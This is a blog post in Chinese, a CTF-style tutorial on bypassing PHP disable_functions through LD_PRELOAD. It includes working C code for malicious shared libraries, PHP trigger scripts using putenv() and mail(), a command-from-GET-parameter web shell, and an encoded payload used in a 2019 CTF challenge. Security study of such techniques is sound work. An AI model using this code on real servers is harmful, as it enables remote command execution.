@@ -1,0 +1,319 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>LD_PRELOAD绕过disable_function | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="LD_PRELOAD绕过disable_function | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="背景知识
+LD_PRELOAD
+LD_PRELOAD是一个由动态链接器（dynamic linker）识别的特殊环境变量，它可以让你指定在程序运行时优先加载的动态库（dynamic library）。
+LD_PRELOAD列表中的库会在程序..." />
+    <meta name="keywords" content="PHP,命令执行" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    Welcome to Internet
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              LD_PRELOAD绕过disable_function
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-07-01
+              </span>
+              <span>
+                7 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/8uAawjb9S/" class="post-tag">
+                  # PHP
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/x1DzYssV5/" class="post-tag">
+                  # 命令执行
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/ld_preload-rao-guo-disable_function.jpeg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="背景知识">背景知识</h1>
+<h2 id="ld_preload">LD_PRELOAD</h2>
+<p>LD_PRELOAD是一个由动态链接器（dynamic linker）识别的特殊环境变量，它可以让你指定在程序运行时优先加载的动态库（dynamic library）。</p>
+<p>LD_PRELOAD列表中的库会在程序运行时加载，并且在任何其他库之前加载。这样，它们就可以覆盖其他库的函数，例如C库（libc）的函数。</p>
+<h2 id="静态链接库">静态链接库</h2>
+<p>静态链接是在编译阶段将库的代码嵌入到目标可执行文件中。也就是说，库中的函数和数据被复制到生成的可执行文件中。因此，静态链接产生的可执行文件可以独立运行，不依赖于任何外部库。静态链接库的扩展名通常为 .a（在 Unix 系统下）或 .lib（在 Windows 系统下）。</p>
+<h2 id="动态链接库">动态链接库</h2>
+<p>动态链接库（也称为共享库）与静态链接库不同。当你使用动态链接库编译程序时，库的代码不会被嵌入到可执行文件中。取而代之的是，在<strong>运行时</strong>，<strong>动态链接器</strong>（如 Unix 系统下的 ld.so 或 ld-linux.so）会负责加载库并将其链接到可执行文件。这些信息存储在程序的头部。然后，动态链接器会搜索这些库，并将它们加载到内存中。</p>
+<p>当库被加载到内存后，动态链接器会解析程序中的符号（即函数和变量的名字）。对于每一个未定义的符号，动态链接器会在加载的库中查找这个符号，并建立链接。这个过程被称为重定位。</p>
+<p>一旦所有的符号都被解析并链接，程序就可以开始执行了。在程序执行过程中，如果它调用了一个库中的函数，CPU 会跳转到这个函数在内存中的地址。这个地址在重定位阶段已经被确定。</p>
+<h1 id="攻击思路">攻击思路</h1>
+<h2 id="本地劫持">本地劫持</h2>
+<p>一个帮助理解的例子，以<code>id</code>为例。</p>
+<p>strace跟踪id的实际调用情况<br>
+<img src="https://skyblu3519.github.io/post-images/1688200036977.png" alt="" loading="lazy"></p>
+<p>劫持<code>geteuid</code>函数，首先编写<code>hack.c</code>，其中准备好劫持<code>geteuid</code>的同名函数</p>
+<pre><code class="language-c">#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+void payload() {
+        system(&quot;ls / &gt; ./skky&quot;);
+}
+int geteuid() 
+{
+    if (getenv(&quot;LD_PRELOAD&quot;) == NULL) { return 0; }
+    unsetenv(&quot;LD_PRELOAD&quot;);
+    payload();
+}
+</code></pre>
+<p>然后使用 GCC 编译器来编译 C 语言源文件（hack.c），然后链接生成一个共享库（hack.so）</p>
+<pre><code class="language-shell">gcc -c -fPIC hack.c -o hack
+gcc --share hack -o hack.so
+</code></pre>
+<p>其中：</p>
+<ul>
+<li>fPIC：这个选项告诉 GCC 生成位置无关代码（Position Independent Code）。这是生成动态库（dynamic library）或共享库（shared library）所需要的，因为这种库可以被加载到任何内存地址，而不需要重新定位。</li>
+<li>share：这个选项告诉 GCC 生成一个共享库而不是一个可执行程序。</li>
+</ul>
+<p>准备好这个恶意共享库后，就可以配置<code>LD_PRELOAD</code>环境变量为共享库的路径，紧接着在执行<code>LD_PRELOAD=./hack.so id</code>来调用到这个被覆盖后的<code>geteuid</code>函数<br>
+<img src="https://skyblu3519.github.io/post-images/1688201336484.png" alt="" loading="lazy"></p>
+<h2 id="php劫持">PHP劫持</h2>
+<p>在已有的文章中显示，一般使用php中的<code>mail()</code>函数进行触发</p>
+<pre><code class="language-php">&lt;?php
+mail('','','','');
+?&gt;
+</code></pre>
+<p>strace这个脚本<code>strace php demo.php</code>，发现程序会启子进程来调用<code>sendmail</code>，而<code>sendmail</code>又使用了<code>geteuid</code>函数。于是我们可以像刚刚那样劫持<code>geteuid</code>来执行命令。</p>
+<p>使用PHP<code>putenv()</code>函数来设置<code>LD_PRELOAD=./hack.so</code></p>
+<pre><code class="language-php">&lt;?php
+putenv('LD_PRELOAD=./hack.so');
+mail('','','','');
+?&gt;
+</code></pre>
+<p>运行这个脚本即可<br>
+<img src="https://skyblu3519.github.io/post-images/1688207559542.png" alt="" loading="lazy"></p>
+<p>但如果没有<code>sendmail</code>呢（我的kali就没有装）？事实上只能劫持某个特定的函数也挺麻烦的，不过还有一种更万能的方法。使用下面的代码，来制作我们的共享库：</p>
+<pre><code class="language-c">#define _GNU_SOURCE
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+
+__attribute__ ((__constructor__)) void angel (void){
+    unsetenv(&quot;LD_PRELOAD&quot;);
+    system(&quot;ls&quot;);
+}
+</code></pre>
+<p>其中<code>__attribute__ ((__constructor__))</code>有如下说明：</p>
+<ol>
+<li>It's run when a shared library is loaded, typically during program startup.</li>
+<li>That's how all GCC attributes are; presumably to distinguish them from function calls.</li>
+<li>The destructor is run when the shared library is unloaded, typically at program exit.</li>
+</ol>
+<p>这会在一开始加载动态库的时候，执行<code>__attribute__ ((__constructor__))</code>，进而RCE。</p>
+<p><code>LD_PRELOAD</code>是在脚本中设置的，它可以影响到加载它的进程及其子进程。为了触发加载动态库这一动作，我们必须找到一个能在运行时候启动子进程的函数才行，如果能启动一个子进程，那么我们的设置的<code>LD_PRELOAD</code>就会加载我们的evil shared library。</p>
+<p>使用 <code>strace</code> 命令的 <code>-f</code>来追踪<code>mail</code>函数的所有调用，启动子进程的系统调用通常有 fork, vfork, clone, execve 等，比如：<code>pid 12345 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7f8babb6ea10) = 12346</code>。很显然，<code>mail</code>函数在运行时是启动了子进程的<br>
+<img src="https://skyblu3519.github.io/post-images/1688208873686.png" alt="" loading="lazy"></p>
+<p>将刚刚的C代码编译为动态库<code>neo.so</code>，现在我们来执行这个脚本：</p>
+<pre><code class="language-php">&lt;?php
+putenv(&quot;LD_PRELOAD=./neo.so&quot;);
+mail('','','','');
+?&gt;
+</code></pre>
+<p>成功RCE<br>
+<img src="https://skyblu3519.github.io/post-images/1688209151091.png" alt="" loading="lazy"></p>
+<h2 id="增加一点实用性">增加一点实用性</h2>
+<p>让执行的命令从环境变量中动态获取</p>
+<pre><code class="language-c">#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+
+__attribute__ ((constructor)) void angel (void){
+    unsetenv(&quot;LD_PRELOAD&quot;);
+    char* cmd = getenv(&quot;MY_CMD&quot;);
+    system(cmd);
+}
+</code></pre>
+<p>在PHP中设置环境变量从GET参数中获取</p>
+<pre><code class="language-php">&lt;?php
+$a = $_GET['cmd'];
+$cmd = &quot;$a &gt; /tmp/hackerfile&quot;;
+@putenv(&quot;MY_CMD=&quot;.$cmd);
+putenv(&quot;LD_PRELOAD=/tmp/hack.so&quot;);
+mail(&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);
+echo file_get_contents('/tmp/hackerfile');
+?&gt;
+</code></pre>
+<h1 id="极客大挑战-2019rce-me">[极客大挑战 2019]RCE ME</h1>
+<p>继续上周的内容，现在用LD_PRELOAD绕过<code>disable_function</code>。</p>
+<p>在用<code>?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8C%94%86%A2%D6%D6)</code>拿到shell之后，发现<code>/flag</code>为空，get flag需要执行<code>/readflag</code>。</p>
+<p>Ps.对于上周遗留的问题，这两个括号的作用很可能有两个：</p>
+<ul>
+<li>用于标记取反计算的范围</li>
+<li>PHP7执行函数的一个格式<code>(function)(argv)</code>，eg：<code>(phpinfo)()</code>。另外<code>('phpinfo')()</code>这样在函数名前加上引号也是可以的。</li>
+</ul>
+<p>但是由于<code>disable_functions</code>的限制，这个webshell并不能执行命令<br>
+<img src="https://skyblu3519.github.io/post-images/1688222858338.png" alt="" loading="lazy"></p>
+<p>用LD_PRELOAD绕过，在<code>/tmp</code>目录下上传编译好的共享库<code>hack.so</code>和<code>hack.php</code><br>
+<img src="https://skyblu3519.github.io/post-images/1688223177573.png" alt="" loading="lazy"></p>
+<p>用<code>sky</code>参数执行代码包含<code>/tmp/hack.php</code>，在用<code>cmd</code>参数执行<code>/readflag</code>，命令的结果会被保存在<code>/tmp/hackerfile</code>，同时在页面中读取出来。<br>
+<img src="https://skyblu3519.github.io/post-images/1688223603219.png" alt="" loading="lazy"></p>
+<p>最后，ARM上编译的库无法在x86中执行！因为这坑浪费了好多时间QAQ</p>
+<h1 id="参考链接">参考链接</h1>
+<p><a href="https://www.anquanke.com/post/id/175403">深入浅出LD_PRELOAD &amp; putenv()</a><br>
+<a href="https://blog.csdn.net/xia739635297/article/details/104641082/">【PHP绕过】LD_PRELOAD bypass disable_functions</a></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86">背景知识</a>
+<ul>
+<li><a href="#ld_preload">LD_PRELOAD</a></li>
+<li><a href="#%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93">静态链接库</a></li>
+<li><a href="#%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93">动态链接库</a></li>
+</ul>
+</li>
+<li><a href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF">攻击思路</a>
+<ul>
+<li><a href="#%E6%9C%AC%E5%9C%B0%E5%8A%AB%E6%8C%81">本地劫持</a></li>
+<li><a href="#php%E5%8A%AB%E6%8C%81">PHP劫持</a></li>
+<li><a href="#%E5%A2%9E%E5%8A%A0%E4%B8%80%E7%82%B9%E5%AE%9E%E7%94%A8%E6%80%A7">增加一点实用性</a></li>
+</ul>
+</li>
+<li><a href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019rce-me">[极客大挑战 2019]RCE ME</a></li>
+<li><a href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5">参考链接</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/something-changed-in-the-summer-time/">
+              <h3 class="post-title">
+                Something changed in the Summer time.
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
